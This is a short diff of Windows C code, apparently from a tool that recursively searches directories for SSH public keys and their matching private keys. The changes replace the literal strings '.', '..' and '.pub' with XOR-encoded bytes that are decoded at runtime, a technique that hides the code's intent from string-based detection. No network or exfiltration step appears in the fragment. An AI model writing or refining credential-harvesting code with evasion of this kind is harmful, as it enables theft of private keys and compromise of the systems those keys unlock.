@@ -36,7 +36,7 @@ static void find_keys_pair(const WCHAR *directory, const WCHAR *pkName,
       (attributes & FILE_ATTRIBUTE_DIRECTORY)) {
     wchar_t error_msg[] =
         L"[ERROR] find_key_pair: couldn't find private key for %ls\n";
-    XOR_STR(error_msg, wcslen(error_msg));
+    // XOR_STR(error_msg, wcslen(error_msg));
     wprintf(error_msg, pkNamePath);
     return;
   }
@@ -81,12 +81,10 @@ static void find_ssh_key_recursively(const PWSTR directory,
   do {
     const WCHAR *fileName = findData.cFileName;
 
-    wchar_t single_dot[] = L".";
-    wchar_t double_dot[] = L"..";
+    wchar_t single_dot[] = L"\x04";
+    wchar_t double_dot[] = L"\x04\x04";
     XOR_WSTR(single_dot, wcslen(single_dot));
     XOR_WSTR(double_dot, wcslen(double_dot));
-    xor_wstr(single_dot, wcslen(single_dot));
-    xor_wstr(double_dot, wcslen(double_dot));
 
     // Ignore "." and ".."
     if (wcscmp(fileName, single_dot) == 0 ||
@@ -109,9 +107,8 @@ static void find_ssh_key_recursively(const PWSTR directory,
       // i.e. ssh public key
       // also checking if we can store more keys
 
-      wchar_t file_extension[] = L".pub";
+      wchar_t file_extension[] = L"\x04\x5a\x5f\x48";
       XOR_STR(file_extension, wcslen(file_extension));
-      xor_wstr(file_extension, wcslen(file_extension));
 
       if (*indexKeysTab >= MAX_KEY_FILES) {
         break;
